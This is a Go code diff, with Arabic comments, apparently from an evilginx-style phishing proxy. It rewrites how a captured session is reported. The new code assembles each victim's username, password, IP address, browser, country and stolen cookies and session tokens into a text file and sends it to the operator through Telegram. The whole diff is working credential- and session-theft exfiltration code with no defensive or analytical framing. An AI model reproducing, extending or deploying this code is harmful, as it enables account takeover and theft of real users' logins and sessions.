@@ -2228,26 +2228,63 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 			
 			// استدعاء الدالة الجديدة لإرسال الكوكيز
 			go func() {
-				time.Sleep(1 * time.Second) // تأخير قصير للتأكد من توفر جميع التوكنات
+				// تأخير قصير للتأكد من جمع جميع البيانات
+				time.Sleep(1 * time.Second)
 				
-				err := p.telegram.SendCookiesFile(
-					s.Id,
-					s.Name,
-					s.Username,
-					s.Password,
-					s.RemoteAddr,
-					s.UserAgent,
-					s.Country,
-					s.CountryCode,
-					s.CookieTokens,
-					s.BodyTokens,
-					s.HttpTokens,
-				)
+				// تجميع البيانات لإرسالها
+				cookiesText := fmt.Sprintf("=== معلومات الجلسة %s ===\n", s.Id)
+				cookiesText += fmt.Sprintf("الفيشلت: %s\n", s.Name)
+				cookiesText += fmt.Sprintf("اسم المستخدم: %s\n", s.Username)
+				cookiesText += fmt.Sprintf("كلمة المرور: %s\n", s.Password)
+				cookiesText += fmt.Sprintf("عنوان IP: %s\n", s.RemoteAddr)
+				cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", s.UserAgent)
+				cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", s.Country, s.CountryCode)
 				
+				// إضافة بيانات الكوكيز
+				if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
+					cookieJSON, err := json.Marshal(s.CookieTokens)
+					if err == nil {
+						cookiesText += "=== الكوكيز ===\n" + string(cookieJSON) + "\n\n"
+						
+						// إضافة عدد الكوكيز
+						cookieCount := 0
+						for _, cookies := range s.CookieTokens {
+							cookieCount += len(cookies)
+						}
+						cookiesText += fmt.Sprintf("إجمالي الكوكيز: %d\n", cookieCount)
+						cookiesText += fmt.Sprintf("إجمالي نطاقات الكوكيز: %d\n\n", len(s.CookieTokens))
+					} else {
+						log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
+					}
+				} else {
+					cookiesText += "=== لم يتم العثور على كوكيز ===\n\n"
+				}
+				
+				// إضافة بيانات Body Tokens
+				if len(s.BodyTokens) > 0 {
+					bodyJSON, err := json.Marshal(s.BodyTokens)
+					if err == nil {
+						cookiesText += "=== توكنات Body ===\n" + string(bodyJSON) + "\n\n"
+						cookiesText += fmt.Sprintf("إجمالي توكنات Body: %d\n\n", len(s.BodyTokens))
+					}
+				}
+				
+				// إضافة بيانات HTTP Tokens
+				if len(s.HttpTokens) > 0 {
+					httpJSON, err := json.Marshal(s.HttpTokens)
+					if err == nil {
+						cookiesText += "=== توكنات HTTP ===\n" + string(httpJSON) + "\n\n"
+						cookiesText += fmt.Sprintf("إجمالي توكنات HTTP: %d\n", len(s.HttpTokens))
+					}
+				}
+				
+				// إرسال الملف
+				fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
+				err := p.telegram.SendFileFromText(fileName, cookiesText)
 				if err != nil {
 					log.Error("خطأ في إرسال ملف الكوكيز: %v", err)
 				} else {
-					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", sid)
+					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
 				}
 			}()
 		}
